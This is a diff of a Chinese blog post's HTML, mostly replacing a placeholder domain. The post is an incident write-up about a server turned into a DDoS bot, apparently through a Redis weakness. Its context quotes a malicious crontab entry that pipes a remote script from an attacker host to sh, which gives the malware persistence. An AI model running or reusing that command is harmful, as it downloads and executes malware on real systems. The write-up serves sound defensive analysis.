@@ -91,7 +91,7 @@
 这个进程把CPU资源基本耗尽了，当时想找一下进程的启动文件路径，但方式不对，所以就鲁莽的把进程杀掉了。其实可以执行 cd /proc/xxx 命令切换到进程信息目录，其中xxx是进程id，之后执">
 <meta property="og:type" content="article">
 <meta property="og:title" content="服务器被挂马，执行对外DDoS攻击">
-<meta property="og:url" content="http://yoursite.com/2016/08/23/服务器被挂马，执行对外DDoS攻击/index.html">
+<meta property="og:url" content="http://chenchi.me/2016/08/23/服务器被挂马，执行对外DDoS攻击/index.html">
 <meta property="og:site_name" content="ccincd's blog">
 <meta property="og:description" content="发现服务器被当成了肉鸡，不停的向外发包，以致于CPU飙高以及网络拥挤。经过排查发现了一个木马，并杀掉了向外发包的进程，但不能确定系统已经清理完全了，还需要观察
 
@@ -130,7 +130,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2016/08/23/服务器被挂马，执行对外DDoS攻击/"/>
+  <link rel="canonical" href="http://chenchi.me/2016/08/23/服务器被挂马，执行对外DDoS攻击/"/>
 
   <title> 服务器被挂马，执行对外DDoS攻击 | ccincd's blog </title>
 </head>
@@ -355,7 +355,7 @@
 <p><img src="http://oax5iq75d.bkt.clouddn.com/pps.png" alt=""></p>
 <p>这个进程把CPU资源基本耗尽了，当时想找一下进程的启动文件路径，但方式不对，所以就鲁莽的把进程杀掉了。其实可以执行 <em>cd /proc/xxx</em> 命令切换到进程信息目录，其中xxx是进程id，之后执行 <em>ls -al或ll</em> 命令就可以看到进程的启动路径了，如下图中exe所示（示例）：</p>
 <p><img src="http://oax5iq75d.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-08-23%2013.05.54.png" alt=""></p>
-<h3 id="查询和清理"><a href="#查询和清理" class="headerlink" title="查询和清理"></a>查询和清理</h3><p>执行crontab -l命令发现原本应当存储cron表达式的文件之中存储的竟然是Redis内容，考虑到之前<a href="http://chenchi.me/2016/08/18/Redis%E2%80%9C%E6%BC%8F%E6%B4%9E%E2%80%9D%EF%BC%8CSSH%E5%85%8D%E7%99%BB%E5%BD%95%E6%94%BB%E5%87%BB/" target="_blank" rel="external">Redis漏洞被攻击过</a>，所以这次挂马的方式应该是类似的，crontab的内容如下所示：</p>
+<h3 id="查询和清理"><a href="#查询和清理" class="headerlink" title="查询和清理"></a>查询和清理</h3><p>执行crontab -l命令发现原本应当存储cron表达式的文件之中存储的竟然是Redis内容，考虑到之前<a href="http://chenchi.me/2016/08/18/Redis%E2%80%9C%E6%BC%8F%E6%B4%9E%E2%80%9D%EF%BC%8CSSH%E5%85%8D%E7%99%BB%E5%BD%95%E6%94%BB%E5%87%BB/">Redis漏洞被攻击过</a>，所以这次挂马的方式应该是类似的，crontab的内容如下所示：</p>
 <p><img src="http://oax5iq75d.bkt.clouddn.com/crontab.png" alt=""></p>
 <p>其中有一条命令引起了我的注意：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*/1 * * * * curl -L http://r.chanstring.com/pm.sh?0703 | sh</div></pre></td></tr></table></figure></p>
 <p>这条命令的意思大致是：<br><font color="red">从0点开始，每隔一个小时去请求参数URL的内容并当作脚本来执行。</font><br>通过浏览器来访问 <em><a href="http://r.chanstring.com/pm.sh?0703" target="_blank" rel="external">http://r.chanstring.com/pm.sh?0703</a></em> ，可以得到木马脚本 <em>pm.sh</em> ，如下所示：</p>
@@ -420,7 +420,7 @@
         <div class="ds-share flat" data-thread-key="2016/08/23/服务器被挂马，执行对外DDoS攻击/"
      data-title="服务器被挂马，执行对外DDoS攻击"
      data-content=""
-     data-url="http://yoursite.com/2016/08/23/服务器被挂马，执行对外DDoS攻击/">
+     data-url="http://chenchi.me/2016/08/23/服务器被挂马，执行对外DDoS攻击/">
   <div class="ds-share-inline">
     <ul  class="ds-share-icons-16">
 
@@ -448,7 +448,7 @@
   <div class="comments" id="comments">
     
       <div class="ds-thread" data-thread-key="2016/08/23/服务器被挂马，执行对外DDoS攻击/"
-           data-title="服务器被挂马，执行对外DDoS攻击" data-url="http://yoursite.com/2016/08/23/服务器被挂马，执行对外DDoS攻击/">
+           data-title="服务器被挂马，执行对外DDoS攻击" data-url="http://chenchi.me/2016/08/23/服务器被挂马，执行对外DDoS攻击/">
       </div>
     
   </div>
